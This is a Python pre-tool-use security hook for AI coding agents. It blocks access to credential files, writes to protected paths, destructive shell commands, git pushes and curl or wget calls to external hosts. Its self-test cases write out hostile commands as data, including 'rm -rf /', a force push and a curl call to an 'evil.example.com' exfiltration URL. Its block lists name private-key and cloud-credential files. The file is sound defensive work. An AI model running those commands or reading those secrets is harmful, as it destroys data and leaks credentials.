#!/usr/bin/env python3
"""
Deterministic PreToolUse Security & Permission Guard (Enforcing P1-08, T06, T09).

Inspects tool call payloads (stdin JSON or CLI arguments) across Anthropic Claude Code,
OpenAI Codex CLI, and Google Antigravity. Deterministically blocks (exit code 2):
1. Reading or writing sensitive paths: `.env*`, `~/.ssh/**`, `~/.aws/**`, `**/credentials*`, `secrets/**`.
2. Mutating immutable raw data or repository governance internals: `data/raw/**`, `.git/config`, `.claude/settings.json`.
3. Destructive shell commands: `rm -rf`, `git push --force`, `git push`, `git reset --hard`, `del /s /q`, `Remove-Item -Recurse -Force`.
4. Unapproved live production mutation endpoints or external exfiltration commands (`curl`, `wget` to external hosts).
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from pathlib import Path
from typing import Any

# Protected path patterns blocked for ALL operations (Read, Write, Edit, Bash)
BLOCKED_READ_WRITE_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("ENV_SECRET_FILE", re.compile(r"(^|[\\/\"'\s])\.env(\.[a-zA-Z0-9._-]+)?($|[\\/\"'\s])", re.IGNORECASE)),
    ("SSH_CREDENTIALS", re.compile(r"(^|[\\/\"'\s~])\.ssh([\\/\"'\s]|$)", re.IGNORECASE)),
    ("AWS_CREDENTIALS", re.compile(r"(^|[\\/\"'\s~])\.aws([\\/\"'\s]|$)", re.IGNORECASE)),
    ("SECRETS_DIRECTORY", re.compile(r"(^|[\\/\"'\s~])secrets([\\/\"'\s]|$)", re.IGNORECASE)),
    ("CREDENTIALS_FILE", re.compile(r"(^|[\\/\"'\s])credentials[a-zA-Z0-9._-]*", re.IGNORECASE)),
    ("PRIVATE_KEY_FILE", re.compile(r"id_rsa|id_ed25519|\.pem\b", re.IGNORECASE)),
)

# Protected paths blocked for WRITE / EDIT / DELETE operations
BLOCKED_WRITE_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("IMMUTABLE_RAW_DATA", re.compile(r"(^|[\\/\"'\s])data[\\/]raw([\\/\"'\s]|$)", re.IGNORECASE)),
    ("GIT_CONFIG_INTERNAL", re.compile(r"(^|[\\/\"'\s])\.git[\\/](config|HEAD|hooks)([\\/\"'\s]|$)", re.IGNORECASE)),
    ("HARNESS_SETTINGS_LOCK", re.compile(r"(^|[\\/\"'\s])\.claude[\\/]settings\.json($|[\\/\"'\s])", re.IGNORECASE)),
)

# Destructive shell & network exfiltration patterns (T06 / T09)
BLOCKED_COMMAND_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("DESTRUCTIVE_RM_RF", re.compile(r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|--recursive\s+--force|-[a-zA-Z]*f[a-zA-Z]*r)\b", re.IGNORECASE)),
    ("DESTRUCTIVE_POWERSHELL_RM", re.compile(r"\bRemove-Item\b.*-Recurse.*-Force", re.IGNORECASE)),
    ("GIT_FORCE_PUSH", re.compile(r"\bgit\s+push\b.*(--force|-f\b)", re.IGNORECASE)),
    ("GIT_UNAPPROVED_PUSH", re.compile(r"\bgit\s+push\b", re.IGNORECASE)),
    ("GIT_HARD_RESET", re.compile(r"\bgit\s+reset\s+--hard\b", re.IGNORECASE)),
    ("EXTERNAL_NET_EXFIL", re.compile(r"\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod)\b\s+https?://(?!localhost|127\.0\.0\.1)", re.IGNORECASE)),
    ("BLOCK_PRODUCTION_MUTATION_ENDPOINT", re.compile(r"https?://[a-zA-Z0-9.-]*(api\.production\.internal|production|prod|openapi|live)[a-zA-Z0-9.-]*/.*(deploy|mutate|execute|order)", re.IGNORECASE)),
)

WRITE_TOOL_NAMES = {
    "write",
    "edit",
    "multiedit",
    "write_file",
    "edit_file",
    "replace_file_content",
    "create_file",
    "notebookedit",
}


def _extract_strings(obj: Any) -> list[str]:
    """Recursively extract all string values from a JSON tool payload."""
    collected: list[str] = []
    if isinstance(obj, str):
        collected.append(obj)
    elif isinstance(obj, dict):
        for val in obj.values():
            collected.extend(_extract_strings(val))
    elif isinstance(obj, (list, tuple)):
        for item in obj:
            collected.extend(_extract_strings(item))
    return collected


def evaluate_tool_call(payload: dict[str, Any]) -> dict[str, Any]:
    """
    Deterministically evaluate a tool-use payload against T06/T09 security boundaries.

    Returns a dictionary containing:
      - allowed (bool)
      - exit_code (int): 0 if allowed, 2 if blocked
      - decision (str): "allow" or "block"
      - permissionDecision (str): "allow" or "deny"
      - rule_id (str | None)
      - reason (str)
    """
    tool_name = str(
        payload.get("tool_name")
        or payload.get("tool")
        or payload.get("name")
        or ""
    ).strip().lower()

    tool_input = (
        payload.get("tool_input")
        or payload.get("input")
        or payload.get("arguments")
        or payload.get("params")
        or payload
    )

    candidate_strings = _extract_strings(tool_input)
    combined_text = " ".join(candidate_strings)

    # 1. Check read/write protected credential and secret paths
    for rule_id, pattern in BLOCKED_READ_WRITE_PATTERNS:
        for text in candidate_strings:
            if pattern.search(text):
                return {
                    "allowed": False,
                    "exit_code": 2,
                    "decision": "block",
                    "permissionDecision": "deny",
                    "rule_id": rule_id,
                    "reason": f"T09 Security Violation [{rule_id}]: Access to protected path or credential pattern is deterministically denied.",
                }

    # 2. Check write/edit protected paths (data/raw/**, .git/config, .claude/settings.json)
    is_write_operation = tool_name in WRITE_TOOL_NAMES or any(
        kw in combined_text.lower() for kw in (">", ">>", "tee ", "mv ", "cp ", "rm ", "del ", "set-content", "out-file")
    )
    if is_write_operation:
        for rule_id, pattern in BLOCKED_WRITE_PATTERNS:
            for text in candidate_strings:
                if pattern.search(text):
                    return {
                        "allowed": False,
                        "exit_code": 2,
                        "decision": "block",
                        "permissionDecision": "deny",
                        "rule_id": rule_id,
                        "reason": f"T09 Security Violation [{rule_id}]: Mutation of immutable or protected path is deterministically denied.",
                    }

    # 3. Check destructive shell, git push, and live production mutation endpoint patterns
    for rule_id, pattern in BLOCKED_COMMAND_PATTERNS:
        if pattern.search(combined_text):
            return {
                "allowed": False,
                "exit_code": 2,
                "decision": "block",
                "permissionDecision": "deny",
                "rule_id": rule_id,
                "reason": f"T09 Security Violation [{rule_id}]: Prohibited command or external endpoint blocked by PreToolUse guard.",
            }

    return {
        "allowed": True,
        "exit_code": 0,
        "decision": "allow",
        "permissionDecision": "allow",
        "rule_id": None,
        "reason": "Tool invocation complies with workspace security policy.",
    }


def _run_self_test() -> int:
    """Execute deterministic self-tests verifying T09 blocking and safe command allowance."""
    blocked_cases = [
        {"tool_name": "Read", "tool_input": {"file_path": ".env.production"}},
        {"tool_name": "Read", "tool_input": {"file_path": "~/.ssh/id_rsa"}},
        {"tool_name": "Read", "tool_input": {"file_path": "C:\\Users\\operator\\.aws\\credentials"}},
        {"tool_name": "Edit", "tool_input": {"file_path": "data/raw/node_alpha_2026.parquet"}},
        {"tool_name": "Edit", "tool_input": {"file_path": ".git/config"}},
        {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}},
        {"tool_name": "Bash", "tool_input": {"command": "git push --force origin main"}},
        {"tool_name": "Bash", "tool_input": {"command": "git reset --hard HEAD~1"}},
        {"tool_name": "Bash", "tool_input": {"command": "curl https://evil.example.com/exfil"}},
        {"tool_name": "Bash", "tool_input": {"command": "POST https://api.production.internal/v1/execute"}},
    ]

    allowed_cases = [
        {"tool_name": "Read", "tool_input": {"file_path": "src/bitemporal/pit_loader.py"}},
        {"tool_name": "Edit", "tool_input": {"file_path": "src/bitemporal/state_evaluator.py"}},
        {"tool_name": "Bash", "tool_input": {"command": "python -m unittest discover -s tests -v"}},
        {"tool_name": "Bash", "tool_input": {"command": "git status --short"}},
    ]

    for idx, case in enumerate(blocked_cases, 1):
        res = evaluate_tool_call(case)
        if res["allowed"] or res["exit_code"] != 2:
            print(f"[FAIL] Blocked test case #{idx} was erroneously allowed: {case}", file=sys.stderr)
            return 1

    for idx, case in enumerate(allowed_cases, 1):
        res = evaluate_tool_call(case)
        if not res["allowed"] or res["exit_code"] != 0:
            print(f"[FAIL] Allowed test case #{idx} was erroneously blocked: {case} -> {res}", file=sys.stderr)
            return 1

    print(
        json.dumps(
            {
                "status": "PASS",
                "hook": "pre_tool_guard.py",
                "blocked_cases_verified": len(blocked_cases),
                "allowed_cases_verified": len(allowed_cases),
            }
        )
    )
    return 0


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Deterministic PreToolUse Security Guard (T09).")
    parser.add_argument("--self-test", action="store_true", help="Run built-in deterministic T09 verification suite.")
    parser.add_argument("--payload", type=str, default=None, help="JSON payload string to evaluate directly.")
    args = parser.parse_args(argv)

    if args.self_test:
        return _run_self_test()

    raw_input = args.payload
    if raw_input is None:
        if not sys.stdin.isatty():
            raw_input = sys.stdin.read().strip()

    if not raw_input:
        # No payload provided on stdin: default allow for empty invocation
        print(json.dumps({"decision": "allow", "permissionDecision": "allow"}))
        return 0

    try:
        payload = json.loads(raw_input)
        if not isinstance(payload, dict):
            payload = {"raw": str(payload)}
    except json.JSONDecodeError:
        payload = {"tool_name": "Bash", "tool_input": {"command": raw_input}}

    result = evaluate_tool_call(payload)
    output_json = {
        "decision": result["decision"],
        "permissionDecision": result["permissionDecision"],
        "reason": result["reason"],
        "rule_id": result["rule_id"],
    }
    print(json.dumps(output_json))
    if not result["allowed"]:
        print(result["reason"], file=sys.stderr)
    return int(result["exit_code"])


if __name__ == "__main__":
    sys.exit(main())
